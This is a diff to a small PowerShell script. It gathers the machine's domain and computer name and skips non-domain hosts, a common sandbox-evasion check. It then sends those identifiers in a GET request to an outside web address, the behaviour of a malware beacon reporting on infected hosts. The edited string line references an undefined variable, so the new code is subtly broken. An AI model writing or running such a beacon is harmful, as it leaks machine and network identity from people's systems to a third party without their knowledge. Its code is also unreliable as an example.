@@ -1,13 +1,12 @@
 
 $computerInfo = Get-ComputerInfo  
   
-if ($computerInfo.CsPartOfDomain -eq "False" -or $computerInfo.CsDomain -eq "WORKGROUP") {  
-    Write-Host "bye"  
-    exit  
-} else {  
-    $domain = $computerInfo.Domain  
+if ($computerInfo.CsPartOfDomain) 
+{  
+ $domain = $computerInfo.Domain  
     $computerName = $computerInfo.CsName  
-    $fullString = "$domain\$computerName"  
+    $domain = $computerInfo.CsDomain
+    $fullString = "$domain_$computerName"  
     $url = "http://www.baidu.com/?q=$fullString"  
     try {  
         $response = Invoke-WebRequest -Uri $url -Method Get -UseBasicParsing  
@@ -16,4 +15,9 @@ if ($computerInfo.CsPartOfDomain -eq "False" -or $computerInfo.CsDomain -eq "WOR
     } catch {  
         Write-Host "error: $_"  
     }  
+} 
+else
+{  
+    Write-Host "bye"  
+    exit  
 }
